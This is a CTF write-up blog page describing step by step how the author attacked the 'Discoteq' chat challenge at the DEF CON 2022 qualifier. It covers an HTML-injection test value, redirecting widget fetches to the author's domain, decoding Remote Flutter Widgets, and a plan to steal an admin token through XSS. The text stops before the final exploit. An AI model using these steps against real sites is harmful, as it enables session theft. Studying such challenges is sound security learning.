<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>DEF CON CTF 2022 Qualifier Notes - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-adsense-account" content="ca-pub-1121865251398741">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1121865251398741"
     crossorigin="anonymous"></script>


            
<link href="https://blog.huli.tw/2022/06/03/defcon-2022-qual-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/06/03/en/defcon-2022-qual-writeup/">
    





    <meta name="description" content="This year’s DEF CON CTF qualifier is similar to last year’s, with mostly binary-related problems, and this year requires a lot of reverse knowledge. As someone who basically doesn’t know how to reve">
<meta property="og:type" content="article">
<meta property="og:title" content="DEF CON CTF 2022 Qualifier Notes">
<meta property="og:url" content="https://blog.huli.tw/2022/06/03/en/defcon-2022-qual-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="This year’s DEF CON CTF qualifier is similar to last year’s, with mostly binary-related problems, and this year requires a lot of reverse knowledge. As someone who basically doesn’t know how to reve">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/cover-en.png">
<meta property="article:published_time" content="2022-06-02T15:27:28.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.906Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/defcon-2022-qual-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="DEF CON CTF 2022 Qualifier Notes" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#1740-problem-released">1.1&nbsp;&nbsp;17:40 Problem released</a>
                    
                    
                    
                    <a class="navbar-item" href="#17444m-start-reading-the-problem">1.2&nbsp;&nbsp;17:44(4m) Start reading the problem</a>
                    
                    
                    
                    <a class="navbar-item" href="#175414m-initial-thoughts">1.3&nbsp;&nbsp;17:54(14m) Initial thoughts</a>
                    
                    
                    
                    <a class="navbar-item" href="#180929m-found-vulnerability-and-guessed-complete-attack-chain">1.4&nbsp;&nbsp;18:09(29m) Found vulnerability and guessed complete attack chain</a>
                    
                    
                    
                    <a class="navbar-item" href="#182646m-continue-studying-the-source-code">1.5&nbsp;&nbsp;18:26(46m) Continue studying the source code</a>
                    
                    
                    
                    <a class="navbar-item" href="#183555m-confirm-loading-method">1.6&nbsp;&nbsp;18:35(55m) Confirm loading method</a>
                    
                    
                    
                    <a class="navbar-item" href="#1903-1h-23m-decoding-the-widget">1.7&nbsp;&nbsp;19:03 (1h 23m) Decoding the widget</a>
                    
                    
                    
                    <a class="navbar-item" href="#1937-1h-57m-dinner-break">1.8&nbsp;&nbsp;19:37 (1h 57m) Dinner break</a>
                    
                    
                    
                    <a class="navbar-item" href="#2012-2h-32m-back-to-work-after-dinner">1.9&nbsp;&nbsp;20:12 (2h 32m) Back to work after dinner</a>
                    
                    
                    
                    <a class="navbar-item" href="#2026-2h-46m-found-the-right-direction">1.10&nbsp;&nbsp;20:26 (2h 46m) Found the right direction</a>
                    
                    
                    
                    <a class="navbar-item" href="#2111-3h-31m-found-the-right-way-to-build">1.11&nbsp;&nbsp;21:11 (3h 31m) Found the right way to build</a>
                    
                    
                    
                    <a class="navbar-item" href="#2130-3h-50m-another-team-solved-it">1.12&nbsp;&nbsp;21:30 (3h 50m) Another team solved it</a>
                    
                    
                    
                    <a class="navbar-item" href="#2143-4h-03m-found-other-key-points">1.13&nbsp;&nbsp;21:43 (4h 03m) Found other key points</a>
                    
                    
                    
                    <a class="navbar-item" href="#2222-4h-42m-successfully-triggered-the-event">1.14&nbsp;&nbsp;22:22 (4h 42m) Successfully triggered the event</a>
                    
                    
                    
                    <a class="navbar-item" href="#22565h-16m-back-on-track-starting-to-implement-exploit">1.15&nbsp;&nbsp;22:56(5h 16m) Back on track, starting to implement exploit</a>
                    
                    
                    
                    <a class="navbar-item" href="#23195h-39m-failed-exploit">1.16&nbsp;&nbsp;23:19(5h 39m) Failed exploit</a>
                    
                    
                    
                    <a class="navbar-item" href="#23255h-45m-solved">1.17&nbsp;&nbsp;23:25(5h 45m) Solved 🎉</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#summary">2&nbsp;&nbsp;<b>Summary</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/06/03/defcon-2022-qual-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            DEF CON CTF 2022 Qualifier Notes
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-06-02T15:27:28.000Z" itemprop="datePublished">3 June 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/defcon-2022-qual-writeup/cover.png" style="display:none">

<p>This year’s DEF CON CTF qualifier is similar to last year’s, with mostly binary-related problems, and this year requires a lot of reverse knowledge. As someone who basically doesn’t know how to reverse, I can only sit on the sidelines and cheer on my teammates.</p>
<p>However, the only web problem this year (called Discoteq) was quite interesting. The difficulty was not high, but it tested debugging skills, observation skills, and the ability to quickly learn something new. I think it tested basic skills rather than knowledge of a particular language or framework, which was great.</p>
<p>Since this was the only problem that was easy to solve this year, I decided to write about it in a different way. I will write about my thought process for solving the problem based on the timeline. The time stamp indicates how long it took from the release of the problem.</p>
<span id="more"></span>

<h3><span id="1740-problem-released">17:40 Problem released</span></h3><h3><span id="17444m-start-reading-the-problem">17:44(4m) Start reading the problem</span></h3><p>I started to observe the Discoteq website, which is basically a chat website where you can register and log in to send messages. The communication between receiving and sending messages is done through websockets.</p>
<p><img src="/img/defcon-2022-qual-writeup/p0.png" alt="ui"></p>
<p>In addition to regular text messages, you can also initiate a vote.</p>
<p>Then, I familiarized myself with what the website was doing. After realizing that there weren’t too many features, I started looking at the source code. Although the source code was not provided for this problem, since it was a frontend, I used devtools to look at it and found that it was not too obfuscated or encrypted, so it was quite readable.</p>
<h3><span id="175414m-initial-thoughts">17:54(14m) Initial thoughts</span></h3><p>At this point, I found an API endpoint called <code>POST /api/flag</code> in the source code using <code>/api</code> and <code>/flag</code> as keywords. If you are an admin, you can use this API to get the flag. From the screenshot below, you can also see that there is an AdminPage in the program:</p>
<p><img src="/img/defcon-2022-qual-writeup/p1.png" alt="admin page"></p>
<p>There is also an admin bot for this problem that will read your messages, so I guessed that this problem might be about XSS &#x3D;&gt; getting the admin token (stored in localStorage) &#x3D;&gt; calling the API to get the flag.</p>
<p>However, I didn’t know how to actually do it, so I continued to look at the code.</p>
<h3><span id="180929m-found-vulnerability-and-guessed-complete-attack-chain">18:09(29m) Found vulnerability and guessed complete attack chain</span></h3><p>After playing for a while, I noticed a vulnerability. When you send a message, the JSON looks like this:</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"widget"</span><span class="token punctuation">,</span>
  <span class="token property">"widget"</span><span class="token operator">:</span> <span class="token string">"/widget/chatmessage"</span><span class="token punctuation">,</span>
  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"ewfwefoenfof32of&lt;h1 a=\">test&lt;/h1#ab525155"</span><span class="token punctuation">,</span>
    <span class="token property">"platform"</span><span class="token operator">:</span> <span class="token string">"web"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"recipients"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"qdqwd"</span><span class="token punctuation">,</span>
    <span class="token string">"admin#13371337"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token string">"hello"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After sending the message, the browser sends a request to <code>https://example.com/widget/chatmessage</code> to get data, and the response is as follows:</p>
<p><img src="/img/defcon-2022-qual-writeup/p2.png" alt="chat message"></p>
<p>Text version:</p>
<pre class="line-numbers language-none"><code class="language-none">þRFWcorewidgetscoremateriallocalrootloaded        Containerchild    Columnchildren    Rowchildren    TexttextFrom     TexttextauthoruserstylecolorÊÿ    Paddingpadding@child    Texttextdatatitle
loaded    Columnchildrenpoll_options    Rowchildren    Paddingchild    ElevatedButtonchild    Texttexttext    onPressedapi_postpathdataapiVotebody    selectiontextpadding@$@    Texttextcount    
TextButtonchild    TexttextRefreshstylecolorÿÿ    onPressedloaded        ApiMapperurldataapiGetjsonKeyoptionsdataKeypoll_optionsonLoadedloaded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>It looks like something that has been serialized, and if I change the content of the widget to <code>.huli.tw/test</code>, the browser will fetch something from <code>https://example.com.huli.tw/test</code>. Therefore, I can manipulate where JS goes to get this serialized thing using <code>.huli.tw</code> or <code>@huli.tw</code>.</p>
<p>Therefore, I guessed that this problem is:</p>
<ol>
<li>Find out how to generate this widget</li>
<li>Use the widget to XSS (e.g. add <code>&lt;script&gt;</code> or other XSS payloads)</li>
<li>Let the admin bot load your widget</li>
<li>Get the admin token</li>
<li>Call the API to get the flag</li>
</ol>
<p>Therefore, the next step is to see how to generate this widget, and continue to look for information in the source code.</p>
<h3><span id="182646m-continue-studying-the-source-code">18:26(46m) Continue studying the source code</span></h3><p>I found a function called getChatWidget in the source code that is used to load the widget, but it took some time to study what it was doing.</p>
<p><img src="/img/defcon-2022-qual-writeup/p3.png" alt="getChatWidget"></p>
<h3><span id="183555m-confirm-loading-method">18:35(55m) Confirm loading method</span></h3><p>At this point, I confirmed that it was a set of things called <a target="_blank" rel="noopener" href="https://github.com/flutter/packages/tree/main/packages/rfw">rfw</a>, which stands for Remote Flutter Widgets. Although I had found this set of things on Google when I discovered that it was a remote loading component, and my teammates had also found it, I didn’t dare to confirm it before because I was afraid of going in the wrong direction.</p>
<p>Later, we were able to confirm it because of this code: <a target="_blank" rel="noopener" href="https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32">https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/// The first four bytes of a Remote Flutter Widgets binary library blob.</span>
<span class="token comment">///</span>
<span class="token comment">/// This signature is automatically added by [encodeLibraryBlob] and is checked</span>
<span class="token comment">/// in [decodeLibraryBlob].</span>
<span class="token comment">///</span>
<span class="token comment">/// See also:</span>
<span class="token comment">///</span>
<span class="token comment">///  * [dataBlobSignature], which is the signature for binary data blobs.</span>
<span class="token keyword">const</span> List<span class="token operator">&lt;</span>int<span class="token operator">></span> libraryBlobSignature <span class="token operator">=</span> <span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token punctuation">[</span><span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>These four bytes match the remote widget we saw earlier, so we confirmed that it was generated using this method.</p>
<p>Next, I had to study how to write in Flutter and how to generate widgets. Just installing the Flutter SDK took some time.</p>
<h3><span id="1903-1h-23m-decoding-the-widget">19:03 (1h 23m) Decoding the widget</span></h3><p>Actually, there isn’t much documentation for RFW, so it was faster to just look at the examples. I found the code to encode&#x2F;decode widgets in the example, modified it, and was able to decode our <code>/widget/chatmessage</code>, which looked like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">widget root <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">text</span><span class="token operator">:</span> From
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Expanded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>author<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
                    <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4278230474</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Expanded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Here’s the code I used to decode it:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token string">'dart:io'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">'package:rfw/formats.dart'</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> async <span class="token punctuation">&#123;</span>
  final File currentFile <span class="token operator">=</span> <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">'chatmessage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">decodeLibraryBlob</span><span class="token punctuation">(</span><span class="token keyword">await</span> currentFile<span class="token punctuation">.</span><span class="token function">readAsBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>At this point, my focus was on “how to write a Flutter widget that can be XSSed.” I originally had three ideas:</p>
<ol>
<li>Write HTML directly, like in React.</li>
<li>Write JS code directly, such as using <code>eval()</code> in the widget’s onload event.</li>
<li>Use iframe src or srcdoc to XSS.</li>
</ol>
<p>At first, I thought it would be easy, but the more I researched, the more I realized it wasn’t that simple. I thought Flutter was like React&#x2F;Vue, but then I realized it had its own system and syntax, which was completely different.</p>
<p>You can’t write HTML or JS, and although iframes can be used, they require importing another library, which would cause problems in this problem.</p>
<p>However, since there were no other clues at the time, I continued to research this direction.</p>
<h3><span id="1937-1h-57m-dinner-break">19:37 (1h 57m) Dinner break</span></h3><p>I thought I would finish before dinner, but I was too naive.</p>
<h3><span id="2012-2h-32m-back-to-work-after-dinner">20:12 (2h 32m) Back to work after dinner</span></h3><h3><span id="2026-2h-46m-found-the-right-direction">20:26 (2h 46m) Found the right direction</span></h3><p>At this point, since the path of inserting HTML&#x2F;JS seemed to be a dead end, I wondered if I was going in the wrong direction and if this problem should rely on some existing mechanism.</p>
<p>And just at this time, my teammate asked me to help decode the poll widget, and after seeing the content, I confirmed that this was the right direction:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">widget root <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> From
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>author<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
                    <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4278230474</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Padding</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">padding</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>title
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">switch</span> state<span class="token punctuation">.</span>loaded <span class="token punctuation">&#123;</span>
                <span class="token boolean">true</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token operator">...</span>
                        <span class="token keyword">for</span> loop <span class="token keyword">in</span> data<span class="token punctuation">.</span>poll_options<span class="token operator">:</span> <span class="token function">Row</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token function">Padding</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">ElevatedButton</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                    <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                        <span class="token literal-property property">text</span><span class="token operator">:</span> loop0<span class="token punctuation">.</span>text
                                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                    <span class="token literal-property property">onPressed</span><span class="token operator">:</span> event api_post <span class="token punctuation">&#123;</span>
                                        <span class="token literal-property property">path</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>apiVote<span class="token punctuation">,</span>
                                        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                            <span class="token literal-property property">selection</span><span class="token operator">:</span> loop0<span class="token punctuation">.</span>text
                                        <span class="token punctuation">&#125;</span>
                                    <span class="token punctuation">&#125;</span>
                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                <span class="token literal-property property">padding</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">10.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">]</span>
                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                <span class="token literal-property property">text</span><span class="token operator">:</span> loop0<span class="token punctuation">.</span>count
                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">TextButton</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                                <span class="token literal-property property">text</span><span class="token operator">:</span> Refresh<span class="token punctuation">,</span>
                                <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                    <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4294942366</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">onPressed</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">false</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                    <span class="token punctuation">]</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">null</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">url</span><span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>apiGet<span class="token punctuation">,</span>
                    <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> options<span class="token punctuation">,</span>
                    <span class="token literal-property property">dataKey</span><span class="token operator">:</span> poll_options<span class="token punctuation">,</span>
                    <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">true</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The ApiMapper at the bottom looks like it can send an API, although I don’t know what can be done with it yet, but it’s worth a try.</p>
<p>Then I tried to see if I could rebuild the same widget locally, but no matter how I ran it, there were errors, which took a lot of time.</p>
<h3><span id="2111-3h-31m-found-the-right-way-to-build">21:11 (3h 31m) Found the right way to build</span></h3><p>After various attempts, I found that there was a <code>local</code> word in the remote file, but it didn’t appear when I tried to reproduce it locally. So I guessed that there might be an <code>import local</code> in front, and it turned out to be true.</p>
<p>At this point, I finally figured out how to build a widget that could use ApiMapper.</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> core<span class="token punctuation">.</span>widgets<span class="token punctuation">;</span>
<span class="token keyword">import</span> core<span class="token punctuation">.</span>material<span class="token punctuation">;</span>
<span class="token keyword">import</span> local<span class="token punctuation">;</span>

